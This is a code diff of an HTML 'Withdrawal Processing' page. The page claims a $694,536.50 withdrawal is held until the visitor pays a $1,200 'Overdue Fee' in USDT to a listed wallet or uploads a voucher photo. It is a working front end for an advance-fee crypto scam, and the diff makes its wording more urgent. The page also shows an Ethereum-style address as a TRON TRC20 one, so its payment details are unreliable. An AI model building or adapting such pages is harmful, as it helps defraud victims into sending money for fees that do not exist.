@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Withdrawal</title>
+    <title>Withdrawal Processing</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
@@ -33,14 +33,13 @@
         .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 18px 20px; margin-bottom: 20px; text-align: left; }
         .info-row { display: flex; justify-content: space-between; align-items: center; padding: 9px 0; border-bottom: 1px solid #1e293b; }
         .info-row:last-child { border-bottom: none; padding-bottom: 0; }
-        .info-row:first-child { padding-top: 0; }
         .info-label { font-size: 13px; color: #64748b; }
         .info-value { font-size: 13px; color: #f8fafc; font-weight: 600; text-align: right; }
         .info-value.blue { color: #38bdf8; }
         .info-value.green { color: #4ade80; }
         .info-value.red { color: #f87171; }
 
-        /* Service fee box */
+        /* Commission box */
         .commission-box { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 14px 16px; margin-bottom: 22px; text-align: left; }
         .commission-box .c-title { font-size: 13px; font-weight: 700; color: #f87171; margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
         .commission-box .c-desc { font-size: 13px; color: #94a3b8; line-height: 1.6; }
@@ -52,53 +51,33 @@
         .tab-btn { padding: 12px; background: transparent; border: none; color: #94a3b8; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size: 14px; font-weight: 600; cursor: pointer; transition: background 0.2s, color 0.2s; }
         .tab-btn.active-crypto { background-color: #0f172a; color: #38bdf8; }
         .tab-btn.active-voucher { background-color: #0f172a; color: #f59e0b; }
-        .tab-btn:not(.active-crypto):not(.active-voucher):hover { background-color: rgba(255,255,255,0.04); }
         .panel { display: none; }
         .panel.active { display: block; }
 
-        /* Crypto panel */
-        .network-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(56,189,248,0.1); border: 1px solid #38bdf8; border-radius: 20px; padding: 5px 14px; font-size: 12px; font-weight: 700; color: #38bdf8; letter-spacing: 0.05em; margin-bottom: 16px; }
-        .network-badge::before { content: ''; width: 6px; height: 6px; border-radius: 50%; background: #38bdf8; animation: blink 1.8s infinite; }
+        /* Panels */
+        .network-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(56,189,248,0.1); border: 1px solid #38bdf8; border-radius: 20px; padding: 5px 14px; font-size: 12px; font-weight: 700; color: #38bdf8; margin-bottom: 16px; }
         label { display: block; text-align: left; margin-bottom: 8px; color: #94a3b8; font-size: 14px; }
         .address-wrap { display: flex; gap: 10px; align-items: stretch; margin-bottom: 16px; }
-        .address-input { flex: 1; padding: 13px 14px; background-color: #0f172a; border: 2px solid #334155; color: #f8fafc; border-radius: 8px; font-size: 12px; font-family: 'Courier New', monospace; outline: none; cursor: default; }
-        .address-input:focus { border-color: #38bdf8; }
-        .copy-btn { padding: 13px 16px; background-color: #2563eb; color: white; border: none; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.2s; white-space: nowrap; flex-shrink: 0; }
-        .copy-btn:hover { background-color: #1d4ed8; }
-        .copy-btn.copied { background-color: #16a34a; }
-
-        /* Note box */
-        .note-box { background-color: rgba(245,158,11,0.08); border: 1px solid rgba(245,158,11,0.3); border-radius: 8px; padding: 12px 14px; font-size: 13px; color: #d97706; line-height: 1.6; text-align: left; margin-bottom: 16px; }
-        .note-box strong { color: #f59e0b; }
-
-        /* Buttons */
-        .btn { background-color: #2563eb; color: white; border: none; padding: 14px 28px; font-size: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
-        .btn:hover { background-color: #1d4ed8; }
-        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .address-input { flex: 1; padding: 13px 14px; background-color: #0f172a; border: 2px solid #334155; color: #f8fafc; border-radius: 8px; font-size: 12px; font-family: 'Courier New', monospace; outline: none; }
+        .copy-btn { padding: 13px 16px; background-color: #2563eb; color: white; border: none; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; }
+        
+        .upload-zone { border: 2px dashed #334155; border-radius: 10px; padding: 32px 20px; text-align: center; cursor: pointer; position: relative; background: #0f172a; margin-bottom: 14px; }
+        .upload-zone input[type="file"] { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; z-index: 2; }
+        .note-box { background-color: rgba(245,158,11,0.08); border: 1px solid rgba(245,158,11,0.3); border-radius: 8px; padding: 12px 14px; font-size: 13px; color: #d97706; text-align: left; margin-bottom: 16px; }
+        
+        .btn { background-color: #2563eb; color: white; border: none; padding: 14px 28px; font-size: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; }
         .btn.amber { background-color: #d97706; }
-        .btn.amber:hover { background-color: #b45309; }
-
-        /* Upload */
-        .upload-zone { border: 2px dashed #334155; border-radius: 10px; padding: 32px 20px; text-align: center; cursor: pointer; transition: all 0.2s; position: relative; background: #0f172a; margin-bottom: 14px; }
-        .upload-zone:hover, .upload-zone.dragover { border-color: #f59e0b; background: rgba(245,158,11,0.05); }
-        .upload-zone input[type="file"] { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; }
-        .upload-icon { font-size: 28px; margin-bottom: 8px; }
-        .upload-zone h3 { font-size: 14px; font-weight: 600; color: #f8fafc; margin-bottom: 4px; }
-        .upload-zone p { font-size: 12px; color: #64748b; }
-        .preview-wrap { display: none; margin-bottom: 14px; border-radius: 10px; overflow: hidden; border: 1px solid #334155; position: relative; }
-        .preview-wrap img { width: 100%; max-height: 200px; object-fit: cover; display: block; }
-        .remove-img { position: absolute; top: 8px; right: 8px; background: rgba(0,0,0,0.7); border: none; border-radius: 50%; width: 28px; height: 28px; color: #fff; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-
-        /* Messages */
-        .error-message { display: none; background-color: rgba(239,68,68,0.1); border: 1px solid #ef4444; color: #fca5a5; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; text-align: left; line-height: 1.4; }
-        .success-message { display: none; background-color: rgba(22,163,74,0.1); border: 1px solid #16a34a; color: #86efac; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; text-align: left; line-height: 1.4; }
+        
+        .preview-wrap { display: none; margin-bottom: 14px; border: 1px solid #334155; border-radius: 10px; overflow: hidden; }
+        .preview-wrap img { width: 100%; max-height: 200px; object-fit: cover; }
+        .error-message, .success-message { display: none; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; text-align: left; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="spinner-overlay" id="loading-spinner">
         <div class="spinner"></div>
-        <div class="spinner-text" id="spinner-message">Uploading...</div>
+        <div class="spinner-text" id="spinner-message">Processing...</div>
     </div>
 
     <div class="icon-wrap">
@@ -108,73 +87,76 @@
     </div>
 
     <h2>Withdrawal Processing</h2>
-    <p class="subtitle">Your withdrawal of <strong style="color:#f8fafc;">$694,536.50</strong> is currently being processed. To finalize the transfer, please complete the required service fee payment.</p>
+    <p class="subtitle">Your withdrawal of <strong>$694,536.50</strong> is currently being processed.</p>
 
     <div class="status-badge">⏳ PROCESSING</div>
 
     <div class="info-card">
-        <div class="info-row">
-            <span class="info-label">Withdrawal Amount</span>
-            <span class="info-value green">$694,536.50</span>
-        </div>
-        <div class="info-row">
-            <span class="info-label">Service Fee</span>
-            <span class="info-value red">$1,200.00</span>
-        </div>
-        <div class="info-row">
-            <span class="info-label">Status</span>
-            <span class="info-value blue">Awaiting Fee Payment</span>
-        </div>
+        <div class="info-row"><span class="info-label">Amount</span><span class="info-value">$694,536.50</span></div>
+        <div class="info-row"><span class="info-label">Overdue Fee</span><span class="info-value red">$1,200.00</span></div>
+        <div class="info-row"><span class="info-label">Status</span><span class="info-value blue">Awaiting Payment</span></div>
     </div>
 
     <div class="commission-box">
-        <div class="c-title">🔐 Final Step — Service Fee Required</div>
+        <div class="c-title">⚠️ Overdue Fee Required</div>
         <div class="c-desc">
-            Your withdrawal is queued for release. To proceed, please settle the one-time service fee. This ensures your transaction clears compliance protocols for high-volume transfers.<br><br>
-            ✅ <strong style="color:#fca5a5;">Funds are secure</strong> — this fee is separate and does not impact your withdrawal total.<br><br>
-            ⏳ <strong style="color:#fca5a5;">Action required</strong> — complete the payment below to resume the transfer.
+            Your withdrawal requires a one-time <strong style="color:#fca5a5;">Overdue Fee</strong> to clear compliance protocols. This will not reduce your payout.<br><br>
+            Please settle the fee via TRC20 or upload your payment voucher below.
         </div>
         <div class="c-amount">$1,200.00</div>
-        <div class="c-sub">One-time fee · Pay via TRC20 / USDT or Voucher below</div>
     </div>
 
     <div class="tabs">
-        <button class="tab-btn active-crypto" id="tab-crypto" onclick="switchTab('crypto')">💎 TRC20 / USDT</button>
+        <button class="tab-btn active-crypto" id="tab-crypto" onclick="switchTab('crypto')">💎 TRC20</button>
         <button class="tab-btn" id="tab-voucher" onclick="switchTab('voucher')">🎟️ Voucher</button>
     </div>
 
     <div class="panel active" id="panel-crypto">
-        <div class="network-badge">TRON Network · TRC20</div>
-        <label>USDT (TRC20) Wallet Address</label>
+        <div class="network-badge">TRON Network</div>
         <div class="address-wrap">
             <input class="address-input" id="trc20-display" value="0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8" readonly>
             <button class="copy-btn" id="copy-btn" onclick="copyAddress()">Copy</button>
         </div>
-        <div class="note-box">
-            <strong>⚠️ Important:</strong> Only send <strong>USDT</strong> on the <strong>TRON (TRC20)</strong> network. Sending assets via other networks will result in <strong>permanent loss of funds</strong>.
-        </div>
         <button class="btn" onclick="confirmCrypto()">I've Sent the Payment</button>
-        <div class="success-message" id="crypto-success"></div>
-        <div class="error-message" id="crypto-error"></div>
     </div>
 
     <div class="panel" id="panel-voucher">
-        <p style="color:#94a3b8; font-size:14px; line-height:1.6; margin-bottom:18px; text-align:left;">Upload a clear photo of your voucher. We will verify it and update your withdrawal status shortly.</p>
-        <div class="upload-zone" id="upload-zone"
-             ondragover="handleDrag(event,true)"
-             ondragleave="handleDrag(event,false)"
-             ondrop="handleDrop(event)">
+        <div class="upload-zone" id="upload-zone">
             <input type="file" id="file-input" accept="image/*" onchange="handleFile(this.files[0])">
-            <div class="upload-icon">📎</div>
-            <h3>Tap to upload voucher photo</h3>
-            <p>JPG, PNG or WEBP · Max 5MB</p>
+            <h3>Tap to upload voucher</h3>
         </div>
         <div class="preview-wrap" id="preview-wrap">
-            <img id="preview-img" src="" alt="Voucher preview">
-            <button class="remove-img" onclick="removeImage()">✕</button>
+            <img id="preview-img" src="" alt="preview">
         </div>
-        <div class="error-message" id="voucher-error"></div>
-        <div class="success-message" id="voucher-success"></div>
         <button class="btn amber" id="voucher-btn" disabled onclick="uploadVoucher()">Submit Voucher</button>
     </div>
 </div>
+
+<script>
+    function switchTab(tab) {
+        document.getElementById('panel-crypto').classList.toggle('active', tab === 'crypto');
+        document.getElementById('panel-voucher').classList.toggle('active', tab === 'voucher');
+        document.getElementById('tab-crypto').className = tab === 'crypto' ? 'tab-btn active-crypto' : 'tab-btn';
+        document.getElementById('tab-voucher').className = tab === 'voucher' ? 'tab-btn active-voucher' : 'tab-btn';
+    }
+
+    function handleFile(file) {
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            document.getElementById('preview-img').src = e.target.result;
+            document.getElementById('preview-wrap').style.display = 'block';
+            document.getElementById('voucher-btn').disabled = false;
+        };
+        reader.readAsDataURL(file);
+    }
+
+    function copyAddress() {
+        navigator.clipboard.writeText('0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8');
+        const btn = document.getElementById('copy-btn');
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = 'Copy', 2000);
+    }
+</script>
+</body>
+</html>
